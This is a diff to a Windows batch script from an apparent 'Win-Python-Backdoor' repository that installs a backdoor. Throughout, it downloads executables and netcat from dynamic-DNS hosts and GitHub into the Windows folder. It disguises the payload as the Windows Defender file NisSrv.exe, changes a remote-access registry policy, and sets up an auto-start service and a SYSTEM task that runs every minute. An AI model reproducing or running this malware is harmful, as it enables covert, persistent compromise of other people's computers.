@@ -35,12 +35,13 @@ rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebC
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/nc64.exe','%windir%\nc64.exe')
 set url='http://config02.addns.org'
 %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wget.exe','%windir%\wget.exe')
-%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wofficeie1.exe','%windir%\wofficeie1.exe')
+rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wofficeie1.exe','%windir%\wofficeie1.exe')
 %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/cacert.pem','%windir%\cacert.pem')
-%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/woffice.exe','%windir%\woffice.exe')
-%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/woffice.exe','C:\Program Files\Windows Defender\NisSrv.exe')
+rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/woffice.exe','%windir%\woffice.exe')
+rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/woffice.exe','C:\Program Files\Windows Defender\NisSrv.exe')
 rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/win.bat  -O %windir%\win.bat
 wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/wup.exe  -O %windir%\wup.exe
+wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/wup.exe  -O %windir%\woffice.exe
 wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/nc64.exe  -O %windir%\nc64.exe
 wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/get.bat  -O %windir%\get.bat
 wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/sys.xml  -O %windir%\sys.xml
@@ -50,7 +51,8 @@ reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalA
 rem %windir%\wofficeie1.exe
 SLEEP 10
 taskkill /f /im wup.exe
-copy /y %windir%\wofficeie1.exe %windir%\wup.exe
+rem copy /y %windir%\wofficeie1.exe %windir%\wup.exe
+copy /y %windir%\woffice.exe 'C:\Program Files\Windows Defender\NisSrv.exe'
 sc create wup binPath= "%windir%\wup.exe" DisplayName= "Windows Office" start= auto
 net start wup
 schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "%windir%\woffice.exe" /tn myadobe1 /rl highest /F
